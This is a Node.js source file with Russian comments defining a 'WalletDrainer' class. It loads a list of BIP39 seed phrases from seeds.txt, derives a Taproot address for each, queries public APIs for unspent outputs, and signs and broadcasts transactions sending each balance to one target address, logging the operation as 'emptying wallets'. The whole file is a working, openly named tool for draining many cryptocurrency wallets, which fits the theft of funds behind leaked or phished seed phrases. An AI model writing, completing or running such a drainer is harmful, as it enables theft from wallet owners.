const bitcoin = require('bitcoinjs-lib');
const { BIP32Factory } = require('bip32');
const ecc = require('tiny-secp256k1');
const bip39 = require('bip39');
const fs = require('fs');

// Инициализация BIP32
const bip32 = BIP32Factory(ecc);
bitcoin.initEccLib(ecc);

// Простая замена fetch для Node.js
async function fetch(url, options = {}) {
    const https = require('https');
    const http = require('http');
    const { URL } = require('url');
    
    return new Promise((resolve, reject) => {
        const parsedUrl = new URL(url);
        const client = parsedUrl.protocol === 'https:' ? https : http;
        
        const requestOptions = {
            hostname: parsedUrl.hostname,
            port: parsedUrl.port,
            path: parsedUrl.pathname + parsedUrl.search,
            method: options.method || 'GET',
            headers: options.headers || {}
        };

        const req = client.request(requestOptions, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                resolve({
                    ok: res.statusCode >= 200 && res.statusCode < 300,
                    status: res.statusCode,
                    json: () => Promise.resolve(JSON.parse(data)),
                    text: () => Promise.resolve(data)
                });
            });
        });

        req.on('error', reject);
        
        if (options.body) {
            req.write(options.body);
        }
        
        req.end();
    });
}

class WalletDrainer {
    constructor() {
        this.network = bitcoin.networks.bitcoin; // mainnet
        this.feeRates = {
            slow: 1,      // ~60+ минут
            normal: 10,   // ~30 минут  
            fast: 20,     // ~10 минут
            fastest: 50   // ~1-3 минуты
        };
    }

    // Получение UTXO для адреса
    async getUTXOs(address) {
        const apis = [
            `https://blockstream.info/api/address/${address}/utxo`,
            `https://api.blockcypher.com/v1/btc/main/addrs/${address}?unspentOnly=true`
        ];

        for (const apiUrl of apis) {
            try {
                console.log(`  📡 Запрос UTXO: ${apiUrl.includes('blockstream') ? 'Blockstream.info' : 'BlockCypher'}`);
                
                const response = await fetch(apiUrl);
                if (!response.ok) continue;
                
                const data = await response.json();
                
                if (apiUrl.includes('blockstream')) {
                    return data; // Blockstream возвращает массив UTXO напрямую
                } else {
                    // BlockCypher format
                    return data.txrefs ? data.txrefs.map(utxo => ({
                        txid: utxo.tx_hash,
                        vout: utxo.tx_output_n,
                        value: utxo.value
                    })) : [];
                }
            } catch (error) {
                console.log(`  ❌ Ошибка API: ${error.message}`);
                continue;
            }
        }
        
        throw new Error('Все API недоступны');
    }

    // Рекомендуемая комиссия с blockstream.info
    async getRecommendedFees() {
        try {
            const response = await fetch('https://blockstream.info/api/fee-estimates');
            const fees = await response.json();
            
            return {
                slow: Math.ceil(fees['144'] || 1),      // 144 блока (~24 часа)
                normal: Math.ceil(fees['6'] || 10),     // 6 блоков (~1 час)
                fast: Math.ceil(fees['3'] || 20),       // 3 блока (~30 мин)
                fastest: Math.ceil(fees['1'] || 50)     // 1 блок (~10 мин)
            };
        } catch (error) {
            console.log('  ⚠️ Не удалось получить актуальные комиссии, используем стандартные');
            return this.feeRates;
        }
    }

    // Генерация адреса и приватного ключа из seed фразы
    generateTaprootFromSeed(seedPhrase) {
        try {
            // Валидация seed фразы
            if (!bip39.validateMnemonic(seedPhrase.trim())) {
                throw new Error('Неверная seed фраза');
            }

            // Генерация seed из мнемоники
            const seed = bip39.mnemonicToSeedSync(seedPhrase.trim());
            
            // Создание root ключа
            const root = bip32.fromSeed(seed, this.network);
            
            // BIP86 derivation path для Taproot: m/86'/0'/0'/0/0
            const child = root.derivePath("m/86'/0'/0'/0/0");
            
            // Для P2TR используем только внутренний публичный ключ (без префикса)
            const internalPubkey = child.publicKey.slice(1, 33);
            
            // Создание Taproot адреса (P2TR) 
            const { address, output } = bitcoin.payments.p2tr({
                internalPubkey: internalPubkey,
                network: this.network,
            });

            // Создаем tweaked private key для подписания P2TR транзакций
            const tweakedChildNode = child.tweak(
                bitcoin.crypto.taggedHash('TapTweak', internalPubkey)
            );
            
            return {
                address,
                privateKey: child.privateKey,
                tweakedPrivateKey: tweakedChildNode.privateKey,
                publicKey: child.publicKey,
                internalPubkey,
                output,
                childNode: child,
                tweakedChildNode: tweakedChildNode
            };
        } catch (error) {
            throw new Error(`Ошибка генерации адреса: ${error.message}`);
        }
    }

    // Создание и отправка транзакции
    async createAndBroadcastTransaction(fromSeed, toAddress, feeRate) {
        console.log(`\n🔄 Обработка seed фразы...`);
        
        try {
            // Генерируем кошелек из seed фразы
            const wallet = this.generateTaprootFromSeed(fromSeed);
            console.log(`  📍 Адрес отправителя: ${wallet.address}`);
            
            // Получаем UTXO
            const utxos = await this.getUTXOs(wallet.address);
            if (!utxos || utxos.length === 0) {
                console.log(`  ⚠️ UTXO не найдены, пропускаем`);
                return null;
            }

            // Вычисляем общий баланс
            const totalBalance = utxos.reduce((sum, utxo) => sum + utxo.value, 0);
            console.log(`  💰 Найдено ${utxos.length} UTXO, общий баланс: ${totalBalance} satoshi (${(totalBalance / 100000000).toFixed(8)} BTC)`);

            // Оптимизация UTXO - используем наибольшие UTXO для минимизации размера транзакции
            const sortedUtxos = utxos.sort((a, b) => b.value - a.value);
            
            // Создаем транзакцию
            const psbt = new bitcoin.Psbt({ network: this.network });
            
            let inputValue = 0;
            let inputCount = 0;
            
            // Добавляем UTXO как входы (упрощенный подход для P2TR)
            for (const utxo of sortedUtxos) {
                // Для P2TR создаем witnessUtxo с правильным script
                psbt.addInput({
                    hash: utxo.txid,
                    index: utxo.vout,
                    witnessUtxo: {
                        script: wallet.output, // Используем output script из wallet
                        value: utxo.value,
                    },
                    tapInternalKey: wallet.internalPubkey,
                });
                
                inputValue += utxo.value;
                inputCount++;
                
                // Ограничиваем количество входов для экономии комиссии
                if (inputCount >= 5) break; // Уменьшил лимит для тестирования
            }

            // Рассчитываем приблизительный размер транзакции
            // P2TR input ~57.5 bytes, P2TR output ~43 bytes, overhead ~10 bytes
            const estimatedSize = inputCount * 58 + 43 + 10;
            const fee = Math.ceil(estimatedSize * feeRate);
            
            const outputValue = inputValue - fee;
            
            if (outputValue <= 546) { // dust limit
                console.log(`  ❌ Недостаточно средств для покрытия комиссии (${outputValue} сats после комиссии ${fee} сats)`);
                return null;
            }

            // Добавляем выход
            psbt.addOutput({
                address: toAddress,
                value: outputValue,
            });

            console.log(`  🔧 Подписание транзакции...`);
            
            // Подписываем все входы используя tweaked BIP32 node для P2TR
            for (let i = 0; i < inputCount; i++) {
                try {
                    // Используем tweaked BIP32 node для P2TR подписания
                    psbt.signInput(i, wallet.tweakedChildNode);
                    console.log(`    ✅ Вход ${i + 1} подписан tweaked node`);
                } catch (signError) {
                    console.log(`    ❌ Ошибка подписания входа ${i + 1}: ${signError.message}`);
                    // Попробуем создать специальный signer для Taproot
                    try {
                        console.log(`    🔄 Пробуем специальный Taproot signer...`);
                        const taprootSigner = bitcoin.ECPair.fromPrivateKey(wallet.tweakedPrivateKey, {
                            network: this.network
                        });
                        psbt.signInput(i, taprootSigner);
                        console.log(`    ✅ Вход ${i + 1} подписан специальным signer`);
                    } catch (altError) {
                        console.log(`    ❌ Специальный signer тоже не сработал: ${altError.message}`);
                        throw signError;
                    }
                }
            }

            console.log(`  🔧 Финализация транзакции...`);
            // Финализируем транзакцию
            psbt.finalizeAllInputs();
            
            // Получаем raw транзакцию
            const rawTx = psbt.extractTransaction().toHex();
            
            console.log(`  📄 Размер транзакции: ${rawTx.length / 2} байт`);
            console.log(`  💸 Комиссия: ${fee} satoshi (${(fee / 100000000).toFixed(8)} BTC)`);
            console.log(`  💰 Сумма перевода: ${outputValue} satoshi (${(outputValue / 100000000).toFixed(8)} BTC)`);
            
            // Временно выводим hex для отладки
            console.log(`  🔍 Raw транзакция (первые 100 символов): ${rawTx.substring(0, 100)}...`);
            
            // Отправляем транзакцию
            const txid = await this.broadcastTransaction(rawTx);
            
            return {
                txid,
                fromAddress: wallet.address,
                toAddress,
                amount: outputValue,
                fee,
                utxoCount: inputCount
            };
            
        } catch (error) {
            console.log(`  ❌ Ошибка: ${error.message}`);
            console.log(`  📋 Stack trace: ${error.stack}`);
            return null;
        }
    }

    // Тестовый режим - симуляция транзакции без отправки
    async testTransactionCreation(fromSeed, toAddress, feeRate) {
        console.log(`\n🧪 ТЕСТОВЫЙ РЕЖИМ - симуляция создания транзакции`);
        
        try {
            const wallet = this.generateTaprootFromSeed(fromSeed);
            console.log(`  📍 Адрес отправителя: ${wallet.address}`);
            
            const utxos = await this.getUTXOs(wallet.address);
            if (!utxos || utxos.length === 0) {
                console.log(`  ⚠️ UTXO не найдены`);
                return null;
            }

            const totalBalance = utxos.reduce((sum, utxo) => sum + utxo.value, 0);
            console.log(`  💰 Найдено ${utxos.length} UTXO, общий баланс: ${totalBalance} satoshi`);
            
            // Простой расчет комиссии
            const estimatedSize = utxos.length * 58 + 43 + 10;
            const fee = Math.ceil(estimatedSize * feeRate);
            const outputValue = totalBalance - fee;
            
            console.log(`  📊 Расчеты:`);
            console.log(`    - Размер транзакции: ~${estimatedSize} байт`);
            console.log(`    - Комиссия: ${fee} satoshi (${(fee / 100000000).toFixed(8)} BTC)`);
            console.log(`    - К переводу: ${outputValue} satoshi (${(outputValue / 100000000).toFixed(8)} BTC)`);
            
            if (outputValue <= 546) {
                console.log(`  ❌ Недостаточно средств после комиссии`);
                return null;
            }
            
            console.log(`  ✅ Транзакция может быть создана успешно`);
            return { success: true, amount: outputValue, fee };
            
        } catch (error) {
            console.log(`  ❌ Ошибка тестирования: ${error.message}`);
            return null;
        }
    }
    async getPreviousTransaction(txid) {
        const apis = [
            `https://blockstream.info/api/tx/${txid}`,
            `https://api.blockcypher.com/v1/btc/main/txs/${txid}`
        ];

        for (const apiUrl of apis) {
            try {
                const response = await fetch(apiUrl);
                if (!response.ok) continue;
                
                const data = await response.json();
                
                if (apiUrl.includes('blockstream')) {
                    return data;
                } else {
                    // Преобразуем формат BlockCypher в формат Blockstream
                    return {
                        vout: data.outputs.map(output => ({
                            scriptpubkey_raw: output.script,
                            value: output.value
                        }))
                    };
                }
            } catch (error) {
                continue;
            }
        }
        
        return null;
    }

    // Отправка транзакции в сеть
    async broadcastTransaction(rawTx) {
        const apis = [
            {
                url: 'https://blockstream.info/api/tx',
                method: 'POST',
                body: rawTx,
                headers: { 'Content-Type': 'text/plain' }
            },
            {
                url: 'https://api.blockcypher.com/v1/btc/main/txs/push',
                method: 'POST',
                body: JSON.stringify({ tx: rawTx }),
                headers: { 'Content-Type': 'application/json' }
            }
        ];

        for (const api of apis) {
            try {
                console.log(`  📡 Отправка через ${api.url.includes('blockstream') ? 'Blockstream.info' : 'BlockCypher'}`);
                
                const response = await fetch(api.url, {
                    method: api.method,
                    body: api.body,
                    headers: api.headers
                });

                if (response.ok) {
                    const result = await response.text();
                    const txid = api.url.includes('blockstream') ? result : JSON.parse(result).tx.hash;
                    console.log(`  ✅ Транзакция отправлена! TXID: ${txid}`);
                    return txid;
                }
            } catch (error) {
                console.log(`  ❌ Ошибка отправки: ${error.message}`);
                continue;
            }
        }
        
        throw new Error('Не удалось отправить транзакцию через все API');
    }

    // Основная функция опустошения кошельков
    async drainWallets(targetAddress, feeRate = 10) {
        console.log('====================================================================================================');
        console.log('💸 ОПУСТОШЕНИЕ TAPROOT КОШЕЛЬКОВ');
        console.log('====================================================================================================');
        console.log(`🎯 Адрес получателя: ${targetAddress}`);
        console.log(`⚡ Комиссия: ${feeRate} sat/byte`);
        console.log('====================================================================================================');

        // Проверяем файл seeds.txt
        if (!fs.existsSync('seeds.txt')) {
            throw new Error('Файл seeds.txt не найден');
        }

        const seedsContent = fs.readFileSync('seeds.txt', 'utf8');
        const seeds = seedsContent.split('\n')
            .map(line => line.trim())
            .filter(line => line.length > 0);

        if (seeds.length === 0) {
            throw new Error('Файл seeds.txt пуст');
        }

        console.log(`Загружено ${seeds.length} seed фраз из файла\n`);

        const results = [];
        let totalDrained = 0;
        let successCount = 0;

        for (let i = 0; i < seeds.length; i++) {
            console.log(`Обработка seed ${i + 1}/${seeds.length}:`);
            console.log(`Seed: ${seeds[i].substring(0, 30)}...`);
            
            try {
                const result = await this.createAndBroadcastTransaction(seeds[i], targetAddress, feeRate);
                
                if (result) {
                    results.push(result);
                    totalDrained += result.amount;
                    successCount++;
                    console.log(`  ✅ Успешно переведено!`);
                } else {
                    console.log(`  ⚠️ Нет средств для перевода`);
                }
                
                // Задержка между транзакциями
                if (i < seeds.length - 1) {
                    console.log(`  ⏳ Ожидание 3 секунды...`);
                    await new Promise(resolve => setTimeout(resolve, 3000));
                }
                
            } catch (error) {
                console.log(`  ❌ Ошибка: ${error.message}`);
            }
            
            console.log('');
        }

        // Сохранение результатов
        if (results.length > 0) {
            this.saveResults(results, targetAddress, feeRate);
        }

        // Итоговая статистика
        console.log('====================================================================================================');
        console.log('ИТОГОВАЯ СТАТИСТИКА ОПУСТОШЕНИЯ');
        console.log('====================================================================================================');
        console.log(`Всего seed фраз: ${seeds.length}`);
        console.log(`Успешных переводов: ${successCount}`);
        console.log(`Общая сумма переведена: ${(totalDrained / 100000000).toFixed(8)} BTC`);
        console.log(`Адрес получателя: ${targetAddress}`);
        console.log('====================================================================================================');

        return results;
    }

    // Сохранение результатов
    saveResults(results, targetAddress, feeRate) {
        const timestamp = new Date().toISOString();
        const filename = `drain_results_${timestamp.replace(/:/g, '-').replace(/\./g, '-')}.json`;
        
        const report = {
            timestamp,
            targetAddress,
            feeRate,
            totalTransactions: results.length,
            totalAmountDrained: results.reduce((sum, r) => sum + r.amount, 0),
            totalFeesPaid: results.reduce((sum, r) => sum + r.fee, 0),
            transactions: results
        };

        fs.writeFileSync(filename, JSON.stringify(report, null, 2));
        console.log(`💾 Результаты сохранены в файл: ${filename}`);
    }

    // Интерактивный выбор комиссии
    async selectFeeRate() {
        const readline = require('readline');
        const rl = readline.createInterface({
            input: process.stdin,
            output: process.stdout
        });

        console.log('\n⚡ ВЫБОР КОМИССИИ ТРАНЗАКЦИИ:');
        
        // Получаем актуальные комиссии
        const fees = await this.getRecommendedFees();
        
        console.log('1. 🐌 Медленно  :', `${fees.slow} sat/byte (несколько часов)`);
        console.log('2. 🚶 Обычно    :', `${fees.normal} sat/byte (~1 час)`);
        console.log('3. 🏃 Быстро    :', `${fees.fast} sat/byte (~30 минут)`);
        console.log('4. ⚡ Очень быстро:', `${fees.fastest} sat/byte (~10 минут)`);
        console.log('5. 🔧 Своя комиссия');

        return new Promise((resolve) => {
            rl.question('\nВыберите вариант (1-5): ', (answer) => {
                rl.close();
                
                switch (answer.trim()) {
                    case '1':
                        resolve(fees.slow);
                        break;
                    case '2':
                        resolve(fees.normal);
                        break;
                    case '3':
                        resolve(fees.fast);
                        break;
                    case '4':
                        resolve(fees.fastest);
                        break;
                    case '5':
                        const customRl = readline.createInterface({
                            input: process.stdin,
                            output: process.stdout
                        });
                        customRl.question('Введите комиссию (sat/byte): ', (customFee) => {
                            customRl.close();
                            const fee = parseInt(customFee);
                            resolve(isNaN(fee) ? fees.normal : fee);
                        });
                        break;
                    default:
                        console.log('Используется стандартная комиссия');
                        resolve(fees.normal);
                }
            });
        });
    }
}

module.exports = WalletDrainer;
